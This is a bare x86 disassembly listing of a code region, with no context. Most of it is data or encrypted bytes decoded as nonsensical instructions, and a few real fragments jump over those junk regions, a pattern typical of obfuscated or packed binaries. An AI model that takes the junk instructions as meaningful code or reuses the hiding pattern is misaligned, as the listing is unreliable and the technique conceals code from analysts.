  40abd2:	and    BYTE PTR [ecx],ch
  40abd4:	and    eax,0x5f5d3b3a
  40abd9:	ret    
  40abda:	shl    DWORD PTR [ebp+0xd0b8817],0xca
  40abe1:	out    dx,al
  40abe2:	inc    esp
  40abe3:	pushf  
  40abe4:	or     DWORD PTR [ebx-0x21],ebx
  40abe7:	stos   DWORD PTR es:[edi],eax
  40abe8:	retf   
  40abe9:	iret   
  40abea:	jnp    0x40abaa
  40abec:	mov    ecx,0x5e839eab
  40abf1:	push   0xfffffff2
  40abf3:	inc    ecx
  40abf4:	fmul   QWORD PTR [edx]
  40abf6:	int    0xde
  40abf8:	adc    eax,0xd796144c
  40abfd:	xchg   esi,eax
  40abfe:	jl     0x40ac1f
  40ac00:	aaa    
  40ac01:	imul   edi,DWORD PTR [esi-0x6197f7b1],0x77ba3399
  40ac0b:	inc    edx
  40ac0c:	test   cl,dh
  40ac0e:	or     BYTE PTR [ebp+0x3f058d2c],al
  40ac14:	ret    
  40ac15:	inc    esi
  40ac16:	fisttp QWORD PTR [ebx]
  40ac18:	mov    bl,0x98
  40ac1a:	leave  
  40ac1b:	cdq    
  40ac1c:	pop    esi
  40ac1d:	mov    eax,0x84b5dae3
  40ac22:	mov    dh,0x91
  40ac24:	xor    eax,0x6171522e
  40ac29:	ret    
  40ac2a:	xchg   esi,eax
  40ac2b:	push   eax
  40ac2c:	pop    DWORD PTR [ebx+ebx*8-0x79]
  40ac30:	addr16 jo 0x40ac10
  40ac33:	dec    esi
  40ac34:	cmp    al,0xcb
  40ac36:	loopne 0x40ac81
  40ac38:	test   al,0xe2
  40ac3a:	xchg   DWORD PTR [edx],edx
  40ac3c:	cmp    edx,edi
  40ac3e:	lahf   
  40ac3f:	fsubr  DWORD PTR [edi+0x17]
  40ac42:	adc    eax,0xd103f903
  40ac47:	imul   edx,edi
  40ac4a:	mov    edi,DWORD PTR [ebp-0x8]
  40ac4d:	jmp    0x40afc0
  40ac52:	icebp  
  40ac53:	cs mov ah,0x3e
  40ac56:	ja     0x40ac9e
  40ac58:	jno    0x40ac8b
  40ac5a:	mov    esi,0x486a3c5e
  40ac5f:	loop   0x40abed
  40ac61:	push   esp
  40ac62:	cmp    eax,0xca7c7cfc
  40ac67:	jns    0x40ace5
  40ac69:	jl     0x40ac70
  40ac6b:	loopne 0x40ac4f
  40ac6d:	loope  0x40ac14
  40ac6f:	call   0x24c0a3e4
  40ac74:	aam    0xc9
  40ac76:	pop    edi
  40ac77:	or     edi,DWORD PTR [edi+esi*1+0x58]
  40ac7b:	and    DWORD PTR [edi*2+0x95b40ae],0xc383583b
  40ac86:	mov    ecx,ecx
  40ac88:	pop    ss
  40ac89:	jge    0x40ac85
  40ac8b:	jb     0x40ac41
  40ac8d:	inc    ebx
  40ac8e:	mov    eax,ds:0x9de55c5c
  40ac93:	rcr    BYTE PTR [eax-0x18],1
  40ac96:	push   ecx
  40ac97:	repz cmp BYTE PTR [edi-0x7],al
  40ac9b:	les    edx,FWORD PTR [eax-0x5968f26f]
  40aca1:	cmp    eax,0xc99d0ffa
  40aca6:	dec    ebp
  40aca7:	sbb    al,0x6
  40aca9:	repnz jmp 0x9dde:0x67ebd6a3
  40acb1:	repnz sub dh,BYTE PTR [eax]
  40acb4:	or     al,0x1b
  40acb6:	fcmovu st,st(5)
  40acb8:	outs   dx,BYTE PTR ds:[esi]
  40acb9:	pop    ebp
  40acba:	dec    ebp
  40acbb:	ins    DWORD PTR es:[di],dx
  40acbd:	out    0xa8,eax
  40acbf:	inc    esp
  40acc0:	call   0xcf1f:0x123f9091
  40acc7:	rcr    DWORD PTR [edx+0xdfd4fc7],0xbf
  40acce:	jnp    0x40ad20
  40acd0:	repz (bad) 
  40acd2:	fimul  DWORD PTR [ecx+ebx*1]
  40acd5:	(bad)  
  40acd6:	ds mov dl,0xb1
  40acd9:	mov    esi,0x52ae597
  40acde:	fistp  WORD PTR [ecx+edx*2-0x6b233680]
  40ace5:	adc    dl,BYTE PTR [ebp-0x38ecda27]
  40aceb:	stos   BYTE PTR es:[edi],al
  40acec:	adc    DWORD PTR [ecx-0x14d8964b],0x4227ced5
  40acf6:	cmc    
  40acf7:	les    edx,FWORD PTR [ebx]
  40acf9:	mov    ebx,0xa593c9d7
  40acfe:	es push eax
  40ad00:	jle    0x40aced
  40ad02:	push   ebx
  40ad03:	icebp  
  40ad04:	enter  0xabad,0x75
  40ad08:	xchg   ebx,eax
  40ad09:	mov    esp,0x633967d5
  40ad0e:	adc    dh,bl
  40ad10:	cmp    al,0x82
  40ad12:	add    BYTE PTR [ebp-0x49],0x6b
  40ad16:	dec    DWORD PTR [edx-0x6371ff44]
  40ad1c:	retf   
  40ad1d:	cmp    eax,0xfd29f9e9
  40ad22:	dec    ecx
  40ad23:	pop    edx
  40ad24:	xchg   ecx,eax
  40ad25:	cmp    bh,BYTE PTR [ebx+0x19c089bb]
  40ad2b:	ja     0x40ad09
  40ad2d:	(bad)  
  40ad2e:	(bad)  
  40ad2f:	xchg   ecx,eax
  40ad30:	int    0x71
  40ad32:	mov    dh,0xba
  40ad34:	add    eax,ecx
  40ad36:	mov    bh,0x21
  40ad38:	ficomp DWORD PTR [ebp-0x32a55c0]
  40ad3e:	in     al,dx
  40ad3f:	jns    0x40ad86
  40ad41:	in     eax,0x7e
  40ad43:	outs   dx,BYTE PTR ds:[esi]
  40ad44:	inc    edi
  40ad45:	scas   al,BYTE PTR es:[edi]
  40ad46:	cld    
  40ad47:	jae    0x40ad47
  40ad49:	mov    esi,0x5f7d35dd
  40ad4e:	push   esi
  40ad4f:	repnz out 0xf,eax
  40ad52:	xor    eax,0xcc69fc51
  40ad57:	adc    DWORD PTR [ebx],esi
  40ad59:	aas    
  40ad5a:	lock hlt 
  40ad5c:	sub    al,0xfd
  40ad5e:	pusha  
  40ad5f:	ret    
  40ad60:	aam    0xc2
  40ad62:	je     0x40ad17
  40ad64:	ins    BYTE PTR es:[edi],dx
  40ad65:	or     BYTE PTR [edi-0x7f],dl
  40ad68:	xor    cl,al
  40ad6a:	mov    bl,0x18
  40ad6c:	cmc    
  40ad6d:	je     0x40ad9c
  40ad6f:	mov    ebp,0x3fc22c96
  40ad74:	xor    DWORD PTR [ebx+eiz*1-0x4],eax
  40ad78:	in     eax,dx
  40ad79:	jnp    0x40ad19
  40ad7b:	ins    DWORD PTR es:[edi],dx
  40ad7c:	or     al,0xf5
  40ad7e:	pop    ss
  40ad7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad80:	push   esp
  40ad81:	mov    ch,0x2d
  40ad83:	add    al,0x31
  40ad85:	outs   dx,DWORD PTR ds:[esi]
  40ad86:	lods   eax,DWORD PTR ds:[esi]
  40ad87:	and    dl,BYTE PTR [ecx-0x5d]
  40ad8a:	xchg   edx,eax
  40ad8b:	popf   
  40ad8c:	dec    ebp
  40ad8d:	lock push 0x4a
  40ad90:	leave  
  40ad91:	xor    BYTE PTR [ecx+0x50d58ad8],dl
  40ad97:	xor    BYTE PTR [ecx-0x215fb435],bl
  40ad9d:	mov    dl,0x9b
  40ad9f:	(bad)  
  40ada0:	fcom   DWORD PTR [eax]
  40ada2:	das    
  40ada3:	rcr    esp,1
  40ada5:	pop    ecx
  40ada6:	or     edx,0x5d
  40ada9:	dec    esi
  40adaa:	cs xor esp,ecx
  40adad:	faddp  st(7),st
  40adaf:	mov    ?,WORD PTR [eax]
  40adb1:	mov    al,cs:0xc8b9fab8
  40adb7:	aam    0xad
  40adb9:	mov    al,0xfd
  40adbb:	dec    esp
  40adbc:	loope  0x40ae08
  40adbe:	mov    edx,DWORD PTR [eax+edx*2+0x41]
  40adc2:	shr    BYTE PTR [ecx],0x9b
  40adc5:	or     al,0x7f
  40adc7:	pop    ebx
  40adc8:	out    0x18,al
  40adca:	aam    0xd1
  40adcc:	jb     0x40ae05
  40adce:	stos   BYTE PTR es:[edi],al
  40adcf:	inc    ebx
  40add0:	neg    DWORD PTR [edx+0x23d301ed]
  40add6:	xor    eax,0x8c4599d6
  40addb:	ret    
  40addc:	pusha  
  40addd:	jbe    0x40ade2
  40addf:	aas    
  40ade0:	ds (bad) 
  40ade2:	mov    edi,0x8594d03c
  40ade7:	mov    cs,ebx
  40ade9:	and    eax,0x9add457b
  40adee:	cmp    al,0x95
  40adf0:	adc    BYTE PTR [eax],ch
  40adf2:	pshufw mm1,QWORD PTR [esi+0x29],0xe2
  40adf7:	mov    dh,0xc4
  40adf9:	pop    ecx
  40adfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adfb:	xor    eax,0xbc87df2d
  40ae00:	mov    esp,0x4b01026c
  40ae05:	int3   
  40ae06:	imul   edx,esp,0xf422af7c
  40ae0c:	leave  
  40ae0d:	xchg   edx,eax
  40ae0e:	xor    BYTE PTR [eax-0x12],ah
  40ae11:	cmp    al,0x95
  40ae13:	mov    WORD PTR [ebp+0x36aaab4],cs
  40ae19:	scas   eax,DWORD PTR es:[edi]
  40ae1a:	jmp    0x2a295d7a
  40ae1f:	(bad)  
  40ae20:	fsub   QWORD PTR [esi-0x5b24c015]
  40ae26:	mov    edi,ebx
  40ae28:	loope  0x40adce
  40ae2a:	dec    ecx
  40ae2b:	(bad)  
  40ae2c:	or     eax,0x93aa256e
  40ae31:	repnz or edi,DWORD PTR [edi+0x6a]
  40ae35:	fdiv   DWORD PTR [ecx+0x21]
  40ae38:	popf   
  40ae39:	bound  eax,QWORD PTR ds:0x43e9229c
  40ae3f:	sub    DWORD PTR [esi-0x1],ecx
  40ae42:	icebp  
  40ae43:	bound  ebx,QWORD PTR [ebp+0x2246fc7c]
  40ae49:	aam    0xa9
  40ae4b:	xlat   BYTE PTR ds:[ebx]
  40ae4c:	pop    ss
  40ae4d:	(bad)  
  40ae4e:	lods   al,BYTE PTR ds:[esi]
  40ae4f:	js     0x40ae4d
  40ae51:	cmp    DWORD PTR [edi+ecx*2],ecx
  40ae54:	arpl   WORD PTR [edx-0x31],si
  40ae57:	data16 (bad) 
  40ae59:	lahf   
  40ae5a:	push   ecx
  40ae5b:	rcr    BYTE PTR [eax],1
  40ae5d:	hlt    
  40ae5e:	aam    0x62
  40ae60:	mov    al,ds:0x5b6e3743
  40ae65:	sub    esi,edx
  40ae67:	xchg   ebp,eax
  40ae68:	jg     0x40ae4a
  40ae6a:	stos   DWORD PTR es:[edi],eax
  40ae6b:	fwait
  40ae6c:	(bad)  
  40ae6d:	cs pop ss
  40ae6f:	int3   
  40ae70:	xor    al,0xe4
  40ae72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae73:	enter  0x632,0xe1
  40ae77:	and    al,ah
  40ae79:	test   al,0x4a
  40ae7b:	int3   
  40ae7c:	div    DWORD PTR [esi]
  40ae7e:	push   ecx
  40ae7f:	lds    edi,FWORD PTR [ebx+ebx*2]
  40ae82:	sub    ecx,DWORD PTR [esi+0x3b15d2f8]
  40ae88:	cmp    dh,ah
  40ae8a:	mov    ecx,0x1e673b4
  40ae8f:	dec    esp
  40ae90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae91:	call   0x8b0c588a
  40ae96:	int    0x89
  40ae98:	or     ebp,DWORD PTR ds:0x63f63377
  40ae9e:	jecxz  0x40ae4a
  40aea0:	mov    ebp,0x451266d6
  40aea5:	jg     0x40ae5b
  40aea7:	or     al,0xbe
  40aea9:	inc    ebp
  40aeaa:	mov    ss,WORD PTR [eax+0x4d47468c]
  40aeb0:	inc    edi
  40aeb1:	push   0x8ad95d7c
  40aeb6:	cmp    eax,0xd08dc5ae
  40aebb:	call   0xf6e1:0xe5bb82e0
  40aec2:	jb     0x40aeb6
  40aec4:	xor    BYTE PTR [ebx-0x50],bl
  40aec7:	out    dx,al
  40aec8:	std    
  40aec9:	iret   
  40aeca:	jmp    0x40af05
  40aecc:	push   ecx
  40aecd:	shl    BYTE PTR [ebx+0x57],cl
  40aed0:	sub    al,0xb5
  40aed2:	jge    0x40aefb
  40aed4:	inc    esi
  40aed5:	xchg   ecx,eax
  40aed6:	icebp  
  40aed7:	sub    edi,ecx
  40aed9:	fwait
  40aeda:	inc    ecx
  40aedb:	adc    al,0x4c
  40aedd:	sbb    al,0x72
  40aedf:	dec    esp
  40aee0:	cli    
  40aee1:	sub    DWORD PTR [edx+0xf],0xd1dcbd3e
  40aee8:	xchg   esp,eax
  40aee9:	xchg   esi,eax
  40aeea:	cs xchg dh,al
  40aeed:	adc    dh,BYTE PTR [edx+0x4931b224]
  40aef3:	mov    ah,0x4
  40aef5:	fsubr  st,st(7)
  40aef7:	xor    eax,0xa7bc9fc
  40aefc:	inc    eax
  40aefd:	xor    ecx,DWORD PTR [edx-0x49801b90]
  40af03:	mov    edi,0x35bece42
  40af08:	or     eax,0x83a3cd36
  40af0d:	(bad)  
  40af0e:	sub    al,0x97
  40af10:	push   es
  40af11:	stc    
  40af12:	dec    esi
  40af13:	mov    cs,ebp
  40af15:	mov    eax,0xcbf61650
  40af1a:	push   ss
  40af1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af1c:	scas   eax,DWORD PTR es:[edi]
  40af1d:	xor    ch,al
  40af1f:	adc    al,0x72
  40af21:	and    BYTE PTR [ebx],bl
  40af23:	stc    
  40af24:	push   0x15
  40af26:	or     dh,ah
  40af28:	shl    DWORD PTR [edi+ecx*4-0x3e],1
  40af2c:	push   ecx
  40af2d:	add    DWORD PTR [edx-0x51],esp
  40af30:	mov    bh,0xbb
  40af32:	sar    BYTE PTR [edx-0x2367ddec],0x54
  40af39:	pushf  
  40af3a:	shl    BYTE PTR [ebx+0x1cc050a1],cl
  40af40:	outs   dx,BYTE PTR ds:[esi]
  40af41:	rol    BYTE PTR [edi-0x605f5e3e],1
  40af47:	in     eax,0xa8
  40af49:	enter  0xbf5a,0x14
  40af4d:	ficomp WORD PTR [ecx+0x74fa4d3]
  40af53:	fidiv  DWORD PTR [esi+ecx*2]
  40af56:	sti    
  40af57:	fisubr DWORD PTR [ecx-0x74]
  40af5a:	test   BYTE PTR [edx+ebx*2+0x6c9937a3],al
  40af61:	stos   BYTE PTR es:[edi],al
  40af62:	retf   
  40af63:	xor    esi,DWORD PTR ds:0x6e1b4b9b
  40af69:	cld    
  40af6a:	lock aam 0x1c
  40af6d:	xor    al,0x82
  40af6f:	lds    ebp,FWORD PTR [ebx]
  40af71:	add    al,0x78
  40af73:	add    eax,0x19b355c8
  40af78:	mov    dl,0xae
  40af7a:	sub    dl,BYTE PTR [ebx]
  40af7c:	jmp    0x40afe5
  40af7e:	mov    BYTE PTR [esi],bl
  40af80:	pop    edx
  40af81:	out    0x18,al
  40af83:	mov    cl,0xea
  40af85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af86:	jmp    0xeb30:0xb1db9a77
  40af8d:	xchg   ebx,eax
  40af8e:	inc    edx
  40af8f:	sub    eax,DWORD PTR [esi]
  40af91:	sub    DWORD PTR [ebx+0x35],ebx
  40af94:	call   0xc47c:0x81c122d7
  40af9b:	mov    esi,0x23ce036e
  40afa0:	aad    0xfc
  40afa2:	outs   dx,BYTE PTR ds:[esi]
  40afa3:	sub    BYTE PTR [ebx-0x3a862a8c],dl
  40afa9:	xchg   esp,eax
  40afaa:	test   DWORD PTR [esi+0x7f],0x3ec75bfb
  40afb1:	pop    edi
  40afb2:	cld    
  40afb3:	push   esp
  40afb4:	or     BYTE PTR [edi-0x97be721],0x2a
  40afbb:	xor    cl,BYTE PTR [edi]
  40afbd:	cmc    
  40afbe:	loop   0x40b038
  40afc0:	mov    ebx,DWORD PTR [ebp-0x10]
  40afc3:	sub    ebx,edi
  40afc5:	cmp    ebx,edx
  40afc7:	ja     0x40afd5
  40afcd:	mov    edx,DWORD PTR [ebp-0x2c]
  40afd0:	jmp    0x40baa7
  40afd5:	mov    edx,DWORD PTR [ebp-0x34]
  40afd8:	mov    edi,DWORD PTR [ebp-0x4]
  40afdb:	xor    edx,eax
  40afdd:	xor    edi,eax
  40afdf:	add    edi,ecx
  40afe1:	add    edx,ecx
  40afe3:	imul   edx,edi
  40afe6:	mov    edi,DWORD PTR [ebp-0x8]
  40afe9:	mov    ebx,DWORD PTR [ebp-0x10]
  40afec:	sub    ebx,edi
  40afee:	jmp    0x40b361
  40aff3:	rcr    BYTE PTR [esi-0x6b],0x3c
  40aff7:	mov    ebp,0xb3625deb
  40affc:	jecxz  0x40af85
  40affe:	fadd   DWORD PTR [ecx+esi*4-0x6743cea]
  40b005:	jl     0x40b083
  40b007:	retf   0x7c79
  40b00a:	jl     0x40b028
  40b00c:	pop    esi
  40b00d:	mov    bl,0x73
  40b00f:	pusha  
  40b010:	mov    dl,0x4f
  40b012:	or     DWORD PTR [esi-0x51],edx
  40b015:	retf   
  40b016:	scas   al,BYTE PTR es:[edi]
  40b017:	fcomp  DWORD PTR [eax]
  40b019:	pop    esi
  40b01a:	fcmovnb st,st(4)
  40b01c:	sahf   
  40b01d:	mov    al,BYTE PTR fs:[esi]
  40b020:	dec    ebp
  40b021:	xchg   edx,eax
  40b022:	xchg   esp,eax
  40b023:	sub    DWORD PTR [eax],edx
  40b025:	adc    DWORD PTR [eax-0x29],edi
  40b028:	or     al,0xd6
  40b02a:	pop    edi
  40b02b:	sbb    ecx,esp
  40b02d:	cmp    BYTE PTR [ebp-0x68],bl
  40b030:	pushf  
  40b031:	ret    0x332d
  40b034:	fcom   QWORD PTR [eax+0x4b4d7a6]
  40b03a:	(bad)  
  40b03b:	push   ds
  40b03c:	scas   al,BYTE PTR es:[edi]
  40b03d:	std    
  40b03e:	data16 kandw k5,k1,k7
  40b043:	leave  
  40b044:	push   esi
  40b045:	loop   0x40b015
  40b047:	cmp    ah,BYTE PTR [esi]
  40b049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b04a:	mov    esi,0xe9e8c689
  40b04f:	dec    ebp
  40b050:	retf   
  40b051:	mov    esi,0x4758c4fc
  40b056:	sbb    eax,0x10310acb
  40b05b:	jmp    DWORD PTR [ecx]
  40b05d:	jmp    0x24c54a79
  40b062:	mov    ch,0x2d
  40b064:	sub    BYTE PTR [edx],bh
  40b066:	xchg   ebp,eax
  40b067:	sbb    dl,ah
  40b069:	pop    ebx
  40b06a:	adc    BYTE PTR [ebx+ebp*1-0x4a],ah
  40b06e:	xchg   esp,eax
  40b06f:	or     BYTE PTR [ebp-0x56dc7d97],0xf9
  40b076:	and    ah,BYTE PTR [ecx+eax*4+0x39ca3371]
  40b07d:	addr16 jnp 0x40b078
  40b080:	call   DWORD PTR [eax]
  40b082:	sub    BYTE PTR [esi-0x73],cl
  40b085:	adc    al,0x5d
  40b087:	in     al,dx
  40b088:	and    BYTE PTR [ecx+0x528acea4],cl
  40b08e:	mov    al,0x89
  40b090:	mov    eax,0x2361c408
  40b095:	and    esi,DWORD PTR [ecx-0x4557fb26]
  40b09b:	sbb    ah,dl
  40b09d:	jmp    0xd9a1:0x9fc17671
  40b0a4:	lds    esi,FWORD PTR [ecx]
  40b0a6:	lds    edi,FWORD PTR [edx+0x34]
  40b0a9:	dec    ecx
  40b0aa:	fadd   st(1),st
  40b0ac:	iret   
  40b0ad:	mov    esi,esp
  40b0af:	add    DWORD PTR [esi],ecx
  40b0b1:	cmp    BYTE PTR [ebp+0x106ea15d],ah
  40b0b7:	sub    eax,DWORD PTR [ecx]
  40b0b9:	mov    cs:0x279ca3bc,al
  40b0bf:	mov    bl,0xdd
  40b0c1:	xchg   DWORD PTR [edx],eax
  40b0c3:	and    ah,BYTE PTR [edi-0x4a]
  40b0c6:	shl    BYTE PTR [ebx+ebp*4+0x4c],1
  40b0ca:	cmp    al,0xeb
  40b0cc:	imul   edx,DWORD PTR [esi+0x17],0x83596f47
  40b0d3:	xor    cl,cl
  40b0d5:	sub    al,0xf6
  40b0d7:	ret    
  40b0d8:	loopne 0x40b0dc
  40b0da:	repz xor bh,BYTE PTR [esi]
  40b0dd:	dec    esi
  40b0de:	xchg   esp,eax
  40b0df:	icebp  
  40b0e0:	xchg   esp,eax
  40b0e1:	aas    
  40b0e2:	jecxz  0x40b14e
  40b0e4:	cmp    ebx,ecx
  40b0e6:	xor    dl,bl
  40b0e8:	test   DWORD PTR [eax-0xae3d044],edx
  40b0ee:	cmp    BYTE PTR [esi-0x38],ch
  40b0f1:	add    eax,0x582cbf5e
  40b0f6:	retf   
  40b0f7:	stc    
  40b0f8:	pop    esi
  40b0f9:	pop    edi
  40b0fa:	aad    0xb2
  40b0fc:	jmp    0x7f1bc4a4
  40b101:	loop   0x40b10f
  40b103:	xor    ecx,DWORD PTR [edx-0x58]
  40b106:	retf   
  40b107:	inc    ebp
  40b108:	addr16 push ebp
  40b10a:	pop    eax
  40b10b:	call   0x176101c8
  40b110:	shr    edx,0x71
  40b113:	(bad)  
  40b114:	bound  esi,QWORD PTR [esp+eax*2]
  40b117:	stos   DWORD PTR es:[edi],eax
  40b118:	add    eax,0x93a60ad3
  40b11d:	sbb    edi,edx
  40b11f:	jmp    0x65e5:0xa1707e25
  40b126:	cmp    DWORD PTR [edi-0x68],0x7e
  40b12a:	push   ds
  40b12b:	jbe    0x40b112
  40b12d:	ins    BYTE PTR es:[edi],dx
  40b12e:	pop    ebx
  40b12f:	jecxz  0x40b123
  40b131:	call   0x5f3c:0x17a8a4b7
  40b138:	mov    ch,0xcd
  40b13a:	outs   dx,BYTE PTR ds:[esi]
  40b13b:	sbb    ecx,0xbaa8a6e9
  40b141:	sbb    BYTE PTR [edx+0x5795947d],dh
  40b147:	cmp    DWORD PTR [edi+eax*8+0x3b],ebx
  40b14b:	cdq    
  40b14c:	ror    DWORD PTR [ebx-0x7e],cl
  40b14f:	retf   0x186d
  40b152:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b153:	sysenter 
  40b155:	lahf   
  40b156:	or     al,0x7a
  40b159:	das    
  40b15a:	mov    esi,0x8190cc04
  40b15f:	sub    ch,BYTE PTR [eax]
  40b161:	idiv   BYTE PTR [eax*8+0x4044f5a5]
  40b168:	adc    DWORD PTR [eax-0x20e1b3e7],0x2c
  40b16f:	pop    eax
  40b170:	bound  eax,QWORD PTR [eax+0x26673083]
  40b176:	mov    ebx,0xa96d7d23
  40b17b:	inc    edx
  40b17c:	mov    ds:0xcc3017da,al
  40b181:	mov    dh,0xc0
  40b183:	nop
  40b184:	dec    edx
  40b185:	sti    
  40b186:	or     BYTE PTR [esi+ebx*8-0x4060bdea],al
  40b18d:	in     al,dx
  40b18e:	scas   al,BYTE PTR es:[edi]
  40b18f:	add    eax,0x4018234
  40b194:	loope  0x40b18c
  40b196:	ja     0x40b13f
  40b198:	mov    dh,cl
  40b19a:	mov    dl,0xc3
  40b19c:	mov    bh,0x90
  40b19e:	adc    ebx,DWORD PTR [ebx-0x35a0adcb]
  40b1a4:	mov    BYTE PTR [edx+eax*2],dh
  40b1a7:	ja     0x40b208
  40b1a9:	push   ecx
  40b1aa:	jmp    0x40b22a
  40b1ac:	mov    edx,0xbd75d2bc
  40b1b1:	mov    ds:0x5cb0a391,al
  40b1b6:	and    al,BYTE PTR [eax]
  40b1b8:	pop    edx
  40b1b9:	jmp    0x1544af86
  40b1be:	pop    edi
  40b1bf:	mov    edx,0xb19a2eff
  40b1c4:	pusha  
  40b1c5:	xor    eax,0xd8e99053
  40b1ca:	cmp    eax,0x76d77120
  40b1cf:	aaa    
  40b1d0:	popf   
  40b1d1:	jmp    0x40b175
  40b1d3:	shr    BYTE PTR [ecx],cl
  40b1d5:	xor    ebx,DWORD PTR [esi+0x1]
  40b1d8:	inc    esi
  40b1d9:	and    DWORD PTR [ebp+0x2d],edi
  40b1dc:	and    BYTE PTR ds:0x5f3e7a2b,ah
  40b1e2:	cmp    al,0xac
  40b1e4:	and    edx,ebx
  40b1e6:	lahf   
  40b1e7:	push   esi
  40b1e8:	sbb    bl,al
  40b1ea:	mov    dh,0x11
  40b1ec:	iret   
  40b1ed:	pop    edx
  40b1ee:	sbb    eax,0x7dce94db
  40b1f3:	or     esp,ebx
  40b1f5:	jl     0x40b1d6
  40b1f7:	adc    BYTE PTR [edi],ch
  40b1f9:	dec    ebp
  40b1fa:	dec    esi
  40b1fb:	sbb    DWORD PTR [edx*1+0x60bbe779],eax
  40b202:	or     ebx,DWORD PTR [ebx-0x792bd691]
  40b208:	stos   DWORD PTR es:[edi],eax
  40b209:	mov    ah,0xbd
  40b20b:	cmp    BYTE PTR [eax+0x6654213a],0xc5
  40b212:	call   0xf858:0x83a6183b
  40b219:	cmc    
  40b21a:	mov    ebx,0xfeba6b67
  40b21f:	(bad)  
  40b220:	mov    dh,0x7b
  40b222:	cmp    BYTE PTR [ecx+edx*4-0x5fbf04ef],dl
  40b229:	cs leave 
  40b22b:	jb     0x40b222
  40b22d:	cmp    eax,0x767659fa
  40b232:	dec    edx
  40b233:	mov    ds:0x4e3f42c7,al
  40b238:	sbb    BYTE PTR [edi],al
  40b23a:	dec    esi
  40b23b:	stos   BYTE PTR es:[edi],al
  40b23c:	mov    dl,0x6
  40b23e:	es scas eax,DWORD PTR es:[edi]
  40b240:	push   edx
  40b241:	jl     0x40b2ac
  40b243:	sti    
  40b244:	popf   
  40b245:	(bad)  
  40b247:	jns    0x40b22b
  40b249:	jl     0x40b203
  40b24b:	aas    
  40b24c:	into   
  40b24d:	cwde   
  40b24e:	mov    edi,0x880e9a0f
  40b253:	test   BYTE PTR [ebp+0x22c0a3c8],ah
  40b259:	mov    dl,0xfe
  40b25b:	pop    esp
  40b25c:	lds    esi,FWORD PTR [edx-0x64dd7e33]
  40b262:	pop    ebp
  40b263:	pop    esi
  40b264:	idiv   DWORD PTR [edi+ebx*2]
  40b267:	sub    edx,DWORD PTR [ebx]
  40b269:	sbb    DWORD PTR [esi-0x357ca2fc],esp
  40b26f:	neg    ah
  40b271:	stc    
  40b272:	cs aas 
  40b274:	mov    ss,WORD PTR [edi+0x40720001]
  40b27a:	adc    ecx,DWORD PTR [esi-0x2d]
  40b27d:	and    al,0xa3
  40b27f:	call   0x69ca7293
  40b284:	jge    0x40b2a4
  40b286:	pop    ebx
  40b287:	stc    
  40b288:	dec    esp
  40b289:	sub    ecx,eax
  40b28b:	je     0x40b2d3
  40b28d:	jge    0x40b288
  40b28f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b290:	mov    ds:0x1f2be534,al
  40b295:	inc    edx
  40b296:	xor    eax,0xc987c7fc
  40b29b:	xchg   esi,eax
  40b29c:	into   
  40b29d:	xor    BYTE PTR [ebp+0x48d9cec6],ah
  40b2a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2a4:	outs   dx,BYTE PTR ds:[esi]
  40b2a5:	pop    ebx
  40b2a6:	push   ds
  40b2a7:	sbb    eax,0x869046d5
  40b2ac:	inc    ebx
  40b2ad:	sar    BYTE PTR ds:0x21b384d,0x56
  40b2b4:	adc    eax,0x35e20046
  40b2b9:	mov    edi,0x7b3a506b
  40b2be:	daa    
  40b2bf:	sub    dh,dh
  40b2c1:	das    
  40b2c2:	aas    
  40b2c3:	push   ebx
  40b2c4:	cmp    al,0x60
  40b2c6:	mov    al,ds:0xdc6efa1e
  40b2cb:	loopne 0x40b316
  40b2cd:	pcmpeqb mm2,QWORD PTR [ebp-0x25c4f759]
  40b2d4:	pop    edi
  40b2d5:	ss iret 
  40b2d7:	je     0x40b30c
  40b2d9:	sar    DWORD PTR [eax-0x18da80],cl
  40b2df:	fdivr  QWORD PTR [eax]
  40b2e1:	cmp    DWORD PTR [edi+0x72],ecx
  40b2e4:	scas   eax,DWORD PTR es:[edi]
  40b2e5:	push   ss
  40b2e6:	call   0x6c92:0x5ad3f43d
  40b2ed:	fisubr DWORD PTR [edx+0x3790baad]
  40b2f3:	pop    eax
  40b2f4:	sbb    eax,0x9a039711
  40b2f9:	mov    ebx,0xde732e1b
  40b2fe:	xchg   edx,eax
  40b2ff:	pop    ebp
  40b300:	and    eax,0xed171de3
  40b305:	sub    DWORD PTR gs:[ebp-0x21],ebp
  40b309:	sbb    cl,BYTE PTR [ebp+0x9]
  40b30c:	into   
  40b30d:	mov    cl,0x9d
  40b30f:	mov    edx,DWORD PTR [ebx-0x53255dbe]
  40b315:	(bad)  
  40b317:	jp     0x40b33a
  40b319:	cdq    
  40b31a:	cli    
  40b31b:	enter  0xd254,0xe2
  40b31f:	sbb    eax,0x90a6b71e
  40b324:	(bad)  
  40b325:	ins    BYTE PTR es:[edi],dx
  40b326:	ret    
  40b327:	jp     0x40b34d
  40b329:	leave  
  40b32a:	mov    eax,DWORD PTR [esi+0x3db8cc6b]
  40b330:	sub    al,0xe
  40b332:	jmp    0x45818aab
  40b337:	and    eax,0xe1361249
  40b33c:	pop    eax
  40b33d:	cmc    
  40b33e:	and    BYTE PTR [ebx+0xd],ah
  40b341:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b342:	cmp    BYTE PTR [eax+0x63],bl
  40b345:	jo     0x40b30d
  40b347:	and    DWORD PTR [eax],edx
  40b349:	dec    ecx
  40b34a:	adc    bl,BYTE PTR [edx]
  40b34c:	xchg   edi,eax
  40b34d:	popf   
  40b34e:	mov    edx,0x61b8f046
  40b353:	arpl   WORD PTR [edx-0x26],si
  40b356:	rcl    BYTE PTR [edx+0x5c],cl
  40b359:	push   esi
  40b35a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b35b:	mov    esp,0x23c14632
  40b360:	(bad)  
  40b361:	cmp    ebx,edx
  40b363:	ja     0x40b371
  40b369:	mov    edx,DWORD PTR [ebp-0x30]
  40b36c:	jmp    0x40baa7
  40b371:	mov    edx,DWORD PTR [ebp-0x38]
  40b374:	mov    edi,DWORD PTR [ebp-0x4]
